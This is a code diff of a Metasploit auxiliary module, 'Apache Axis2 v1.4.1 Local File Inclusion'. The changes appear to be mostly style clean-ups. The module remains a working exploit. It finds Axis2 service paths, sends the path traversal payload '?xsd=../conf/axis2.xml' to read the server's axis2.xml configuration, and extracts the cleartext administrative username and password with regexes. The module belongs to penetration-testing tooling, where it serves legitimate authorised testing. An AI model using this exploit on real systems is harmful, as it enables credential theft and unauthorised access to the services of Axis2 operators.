@@ -8,25 +8,22 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
-      'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',
-      'Description'    => %q{
+      'Name' => 'Apache Axis2 v1.4.1 Local File Inclusion',
+      'Description' => %q{
           This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
         By loading a local XML file which contains a cleartext username and password, attackers can trivially
         recover authentication credentials to Axis services.
       },
-      'References'     =>
-        [
-          ['EDB', '12721'],
-          ['OSVDB', '59001'],
-        ],
-      'Author'         =>
-        [
-          'Tiago Ferreira <tiago.ccna[at]gmail.com>'
-        ],
-      'License'        =>  MSF_LICENSE
+      'References' => [
+        ['EDB', '12721'],
+        ['OSVDB', '59001'],
+      ],
+      'Author' => [
+        'Tiago Ferreira <tiago.ccna[at]gmail.com>'
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options([
@@ -35,18 +32,18 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     uri = normalize_uri(target_uri.path)
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => uri,
+        'method' => 'GET',
+        'uri' => uri
       }, 25)
 
-      if (res and res.code == 200)
-        res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
-        new_uri = normalize_uri("/axis2/services/#{$1}")
+      if (res && (res.code == 200))
+        res.body.to_s.match(%r{/axis2/services/([^\s]+)\?})
+        new_uri = normalize_uri("/axis2/services/#{::Regexp.last_match(1)}")
         get_credentials(new_uri)
 
       else
@@ -54,10 +51,8 @@ class MetasploitModule < Msf::Auxiliary
         return
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
-
     end
   end
 
@@ -89,12 +84,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_credentials(uri)
-    lfi_payload = "?xsd=../conf/axis2.xml"
+    lfi_payload = '?xsd=../conf/axis2.xml'
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => "#{uri}" + lfi_payload,
+        'method' => 'GET',
+        'uri' => uri.to_s + lfi_payload
       }, 25)
 
       print_status("#{full_uri} - Apache Axis - Dumping administrative credentials")
@@ -107,10 +102,10 @@ class MetasploitModule < Msf::Auxiliary
       if (res.code == 200)
         if res.body.to_s.match(/axisconfig/)
 
-          res.body.scan(/parameter\sname=\"userName\">([^\s]+)</)
-          username = $1
-          res.body.scan(/parameter\sname=\"password\">([^\s]+)</)
-          password = $1
+          res.body.scan(/parameter\sname="userName">([^\s]+)</)
+          username = ::Regexp.last_match(1)
+          res.body.scan(/parameter\sname="password">([^\s]+)</)
+          password = ::Regexp.last_match(1)
 
           print_good("#{full_uri} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")
 
@@ -126,7 +121,6 @@ class MetasploitModule < Msf::Auxiliary
         return :abort
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
